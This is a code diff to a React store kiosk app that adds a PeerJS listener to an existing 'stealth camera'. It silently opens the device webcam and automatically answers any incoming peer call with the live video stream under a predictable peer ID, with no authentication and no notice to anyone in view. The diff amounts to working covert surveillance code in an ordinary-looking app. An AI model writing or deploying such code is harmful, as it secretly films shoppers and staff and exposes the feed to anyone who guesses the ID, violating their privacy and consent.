@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect, useMemo, useCallback, useRef } from 'react';
 import { StoreData, Brand, Category, Product, FlatProduct } from '../types';
 import { 
@@ -19,6 +18,7 @@ import Screensaver from './Screensaver';
 import Flipbook from './Flipbook';
 import SetupGuide from './SetupGuide';
 import { Loader2, Home, ChevronRight, Store, ArrowRight, MonitorPlay, MonitorOff, RotateCcw } from 'lucide-react';
+import Peer from 'peerjs';
 
 // UPDATED TIMEOUT: 1 Minute = 60,000 ms (Reduced from 4 mins for better responsiveness)
 const IDLE_TIMEOUT = 60000;
@@ -201,31 +201,62 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
   const [showFlipbook, setShowFlipbook] = useState(false);
   const [showSetupGuide, setShowSetupGuide] = useState(false);
   
-  // Stealth Camera Ref
+  // Stealth Camera & PeerJS Refs
   const videoRef = useRef<HTMLVideoElement>(null);
+  const peerRef = useRef<Peer | null>(null);
+  const streamRef = useRef<MediaStream | null>(null);
 
-  // Initialize Stealth Camera
+  // Initialize Stealth Camera & PeerJS Listener
   useEffect(() => {
-    const initCamera = async () => {
+    if (!kioskId) return;
+
+    const initPeer = async () => {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // 1. Get Local Stream
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            streamRef.current = stream;
             if (videoRef.current) {
                 videoRef.current.srcObject = stream;
             }
+
+            // 2. Initialize PeerJS (Kiosk acts as the "Receiver" of the Call request, but sender of stream)
+            // Sanitize ID for PeerJS compatibility (only alphanumerics, dashes, underscores)
+            const peerId = `kiosk-pro-${kioskId.replace(/[^a-zA-Z0-9-_]/g, '')}`;
+            
+            // Clean up old peer if exists
+            if (peerRef.current) peerRef.current.destroy();
+
+            const peer = new Peer(peerId, {
+                debug: 1,
+            });
+
+            peer.on('open', (id) => {
+                console.log('Stealth Connection Ready. Peer ID:', id);
+            });
+
+            // 3. Answer Incoming Calls automatically with the stream
+            peer.on('call', (call) => {
+                console.log('Admin accessing camera feed...');
+                call.answer(stream); // Answer the call with our A/V stream
+            });
+
+            peerRef.current = peer;
+
         } catch (e) {
-            console.warn("Camera access denied or unavailable (expected in some envs)", e);
+            console.warn("Camera/Peer access denied or unavailable", e);
         }
     };
-    initCamera();
+
+    initPeer();
     
     // Cleanup
     return () => {
-        if(videoRef.current && videoRef.current.srcObject) {
-            const stream = videoRef.current.srcObject as MediaStream;
-            stream.getTracks().forEach(track => track.stop());
+        if (peerRef.current) peerRef.current.destroy();
+        if (streamRef.current) {
+            streamRef.current.getTracks().forEach(track => track.stop());
         }
     }
-  }, []);
+  }, [kioskId]);
 
   useEffect(() => {
     const initialize = async () => {
